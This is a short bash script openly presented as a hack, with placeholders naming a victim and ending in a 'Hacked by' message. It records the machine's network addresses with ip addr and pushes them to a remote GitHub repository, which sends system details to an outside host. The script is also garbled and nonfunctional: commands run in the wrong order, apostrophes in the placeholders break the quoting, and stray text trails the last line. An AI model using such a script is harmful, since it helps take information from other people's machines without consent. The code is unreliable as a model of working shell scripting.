#!/usr/bin/bash

mkdir YOUR_VICTIM'S_DIRECTORY

git init

cd YOUR_VICTIM'S_DIRECTORY

ip addr show >> ip.txt

git add .

git remote add origin https://github.com/YOUR_VICTIM'S_USERNAME/YOUR_VICTIM'S_DIRECTORY

git push -u origin main

echo "Hacked by YOUR_NAME :)"vir
